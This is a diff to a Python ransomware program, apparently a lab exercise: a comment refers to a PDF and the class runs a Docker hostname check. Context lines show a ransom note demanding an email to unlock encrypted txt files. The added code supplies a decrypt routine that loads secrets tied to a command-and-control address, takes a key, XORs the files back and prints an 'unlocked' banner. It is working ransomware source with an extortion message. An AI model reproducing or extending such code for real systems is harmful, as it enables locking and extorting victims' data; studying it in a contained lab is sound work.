@@ -31,6 +31,30 @@ ENCRYPT_MESSAGE = """
 ⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 Your txt files have been locked. Send an email to rick.asley@hewillnotgiveyouup.net with title '{token}' to unlock your data. 
 """
+
+decrypt_message = """
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢀⣔⣷⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡝⠉⠉⠽⣿⣃⣼⣷⠶⣦⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠫⢿⣄⠀⠀⠈⣿⠁⠀⠀⣁⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⢛⣷⢂⠀⠀⠀⣀⡷⢣⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⣿⡾⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⣿⠀⠀⠀⣿⠇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢚⣾⠀⠀⠀⣽⡀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⣿⠀⠀⠀⣿⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⣸⣿⡏⠉⣙⣿⣿⣷⣶⣖⣷⣶⣿⣿⡲⣶⣲⣿⢗⣶⣖⣶⣲⣾⣛⢗⣷⠀⠀⠀
+⠀⣿⣿⠁⠀⠉⣿⣿⡟⠛⠟⠝⠏⢙⠉⠙⠉⠋⠍⠙⠙⠉⠛⠛⠛⣻⣿⣿⠀⠀⠀
+⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀
+⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀
+⠀⢿⣿⡆⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀
+⠀⠸⣿⣧⡀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀⠀
+⠀⠀⠛⢿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣰⣿⣿⣷⣶⣶⣶⣶⠶⠀⢠⣿⣿⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿⡏⠁⠀⠀⢸⣿⡇⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⡆⠀⠀⠀⣸⣿⠇⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢿⣿⣦⣄⣀⣠⣴⣿⣿⠁⠀⠈⠻⣿⣿⣿⣿⡿⠏⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+Your txt files have been unlocked.
+"""
+
 class Ransomware:
     def __init__(self) -> None:
         self.check_hostname_is_docker()
@@ -72,11 +96,41 @@ class Ransomware:
         print(ENCRYPT_MESSAGE.format(token=hex_token))
 
     def decrypt(self):
-        # main function for decrypting (see PDF)
-        raise NotImplemented()
+        # Load cryptographic elements and the list of encrypted files
+        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
+        secret_manager.load()
+        encrypted_files = self.get_files("*.txt")
+
+        while True:
+            try:
+                # Ask for the key
+                b64_key = input("Enter the decryption key: ")
+
+                # Set the key
+                secret_manager.set_key(b64_key)
+
+                # Decrypt the files
+                secret_manager.xorfiles(encrypted_files)
+
+                # Clean up local cryptographic elements
+                secret_manager.clean()
+
+                # Display a message to inform the user that everything went well
+                print(decrypt_message)
+
+
+
+                # Exit the ransomware
+                break
+            except ValueError as e:
+                print(f"Error: {e}. Please provide a valid decryption key.")
+            except Exception as e:
+                print(f"Unexpected error occurred during decryption: {e}")
+                break
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
+    print(sys.argv)
     if len(sys.argv) < 2:
         ransomware = Ransomware()
         ransomware.encrypt()
